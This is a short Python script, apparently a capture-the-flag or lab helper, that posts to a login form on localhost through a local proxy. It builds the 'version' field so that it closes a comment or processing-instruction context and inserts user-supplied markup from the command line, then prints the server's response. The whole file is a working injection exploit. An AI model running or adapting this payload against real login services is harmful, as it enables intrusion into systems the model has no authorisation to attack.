#!/usr/bin/env python3
import requests
import sys
import re

url = "http://localhost:8081/login"
proxies = {"http": "http://localhost:8080"}
headers = {"Content-Type": "application/x-www-form-urlencoded"}


data = {
	"version": '1.0.0" ?-->' + sys.argv[1].replace("\\","")+ '<!--',
	"username": sys.argv[2],
}

r = requests.post(url,data=data,headers=headers,proxies=proxies)
# match = re.compile('Welcome, (.*)<h1>')
# print(match.findall(r.text))
print(r.text)
